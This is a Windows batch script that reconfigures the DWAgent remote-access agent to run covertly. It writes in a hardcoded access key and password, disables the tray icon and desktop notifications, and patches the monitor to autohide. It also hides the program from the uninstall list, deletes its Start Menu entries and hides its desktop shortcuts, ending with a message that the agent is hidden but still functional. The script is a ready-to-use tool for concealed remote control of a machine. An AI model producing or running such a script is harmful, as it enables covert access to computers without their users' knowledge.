@echo off
echo =============================================
echo DWAgent Configuration Update and Hide Script
echo =============================================
echo.
:: Check if running as administrator
net session >nul 2>&1
if %errorLevel% == 0 (
echo [SUCCESS] Running with administrator privileges
) else (
echo [ERROR] Please run this script as administrator!
echo Right-click the script and select "Run as administrator"
pause
exit /b
)
:: Define paths
set DWAGENT_DIR=C:\Program Files\DWAgent
set CONFIG_FILE=%DWAGENT_DIR%\config.json
set MONITOR_FILE=%DWAGENT_DIR%\ui\monitor.py
:: Check if DWAgent directory exists
if not exist "%DWAGENT_DIR%" (
echo [ERROR] DWAgent directory not found: %DWAGENT_DIR%
pause
exit /b
)
:: Check if files exist
if not exist "%CONFIG_FILE%" (
echo [ERROR] Config file not found: %CONFIG_FILE%
pause
exit /b
)
if not exist "%MONITOR_FILE%" (
echo [ERROR] Monitor file not found: %MONITOR_FILE%
pause
exit /b
)

:: Check if configuration updates are already applied
set CONFIG_UPDATED=0
set MONITOR_UPDATED=0

:: Check if config.json contains the expected configuration
findstr /C:"\"monitor_tray_icon\": false" "%CONFIG_FILE%" >nul
if %errorLevel% == 0 (
    set CONFIG_UPDATED=1
    echo [INFO] Config.json already contains expected configuration.
)

:: Check if monitor.py contains the expected configuration
findstr /C:"\"autohide\"" "%MONITOR_FILE%" >nul
if %errorLevel% == 0 (
    set MONITOR_UPDATED=1
    echo [INFO] Monitor.py already contains expected configuration.
)

:: Create backup
set BACKUP_DIR=C:\DWAgent_Backup_%date:~-4,4%%date:~-7,2%%date:~-10,2%_%time:~0,2%%time:~3,2%
set BACKUP_DIR=%BACKUP_DIR: =0%
echo Creating backup at: %BACKUP_DIR%
mkdir "%BACKUP_DIR%"

if %CONFIG_UPDATED% == 0 (
    copy "%CONFIG_FILE%" "%BACKUP_DIR%\config.json.bak" >nul
)

if %MONITOR_UPDATED% == 0 (
    copy "%MONITOR_FILE%" "%BACKUP_DIR%\monitor.py.bak" >nul
)

:: Stop DWAgent service only if configuration updates are needed
if %CONFIG_UPDATED% == 0 (
    if %MONITOR_UPDATED% == 0 (
        echo Stopping DWAgent service for configuration updates...
        net stop DWAgent >nul 2>&1
        taskkill /F /IM DWAgent.exe >nul 2>&1
    )
)

:: Update config.json only if not already updated
if %CONFIG_UPDATED% == 0 (
    echo Updating config.json...
    echo { > "%CONFIG_FILE%"
    echo   "config_password": "vem7H/QfBZ0HA90mKOx+4XKR5EcBhqbC6B7IeQvPMqU=", >> "%CONFIG_FILE%"
    echo   "enabled": true, >> "%CONFIG_FILE%"
    echo   "key": "WUcXqbpvCxYLlCqvjvWG", >> "%CONFIG_FILE%"
    echo   "listen_port": 7950, >> "%CONFIG_FILE%"
    echo   "monitor_desktop_notification": "none", >> "%CONFIG_FILE%"
    echo   "monitor_tray_icon": false, >> "%CONFIG_FILE%"
    echo   "password": "eJzLqQr2CE4JT/ZPT86tcnFOyY3IrvJOL8xK9AsILMgEAK2qCz4=", >> "%CONFIG_FILE%"
    echo   "url_primary": "https://www.dwservice.net/" >> "%CONFIG_FILE%"
    echo } >> "%CONFIG_FILE%"
)

:: Update monitor.py only if not already updated
if %MONITOR_UPDATED% == 0 (
    echo Updating monitor.py...
    powershell -Command "(Get-Content '%MONITOR_FILE%') -replace 'self._monitor_desktop_notification=\"none\"', 'self._monitor_desktop_notification=\"autohide\"' | Set-Content '%MONITOR_FILE%'"
)

:: Start DWAgent service only if configuration updates were applied
if %CONFIG_UPDATED% == 0 (
    if %MONITOR_UPDATED% == 0 (
        echo Starting DWAgent service...
        net start DWAgent >nul 2>&1
    )
)

:: Hide from uninstall programs list (always execute)
echo Hiding DWAgent from uninstall programs list...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /v "SystemComponent" /t REG_DWORD /d 1 /f >nul 2>&1

:: Hide from Start Menu (always execute)
echo Removing DWAgent from Start Menu...
if exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\DWAgent" (
    rmdir /s /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\DWAgent"
    echo [SUCCESS] DWAgent folder removed from Start Menu.
) else (
    echo [INFO] DWAgent folder not found in Start Menu.
)

:: Check for any remaining shortcuts
echo Checking for any remaining DWAgent shortcuts...
if exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\DWAgent.lnk" (
    del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\DWAgent.lnk"
    echo [SUCCESS] DWAgent shortcut removed from Start Menu.
)

if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\DWAgent.lnk" (
    del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\DWAgent.lnk"
    echo [SUCCESS] DWAgent shortcut removed from user Start Menu.
)

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\DWAgent.lnk" (
    del "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\DWAgent.lnk"
    echo [SUCCESS] DWAgent shortcut removed from user Start Menu.
)

:: Hide desktop shortcut if exists (always execute)
if exist "%PUBLIC%\Desktop\DWAgent.lnk" attrib +h "%PUBLIC%\Desktop\DWAgent.lnk" >nul 2>&1
if exist "%USERPROFILE%\Desktop\DWAgent.lnk" attrib +h "%USERPROFILE%\Desktop\DWAgent.lnk" >nul 2>&1

echo.
echo =============================================
echo [SUCCESS] DWAgent configuration update and hide operations completed!
echo =============================================
echo Backup created at: %BACKUP_DIR%
echo.
if %CONFIG_UPDATED% == 1 (
    echo - Config.json was already updated (skipped)
) else (
    echo - Updated config.json with new configuration
)

if %MONITOR_UPDATED% == 1 (
    echo - Monitor.py was already updated (skipped)
) else (
    echo - Modified monitor.py to set desktop notifications to autohide
)

echo - Hidden DWAgent from uninstall programs list
echo - Removed DWAgent folder and shortcuts from Start Menu
echo - Hidden DWAgent desktop shortcuts if they existed
echo.
echo Note: DWAgent is now hidden from normal view but still functional.
pause
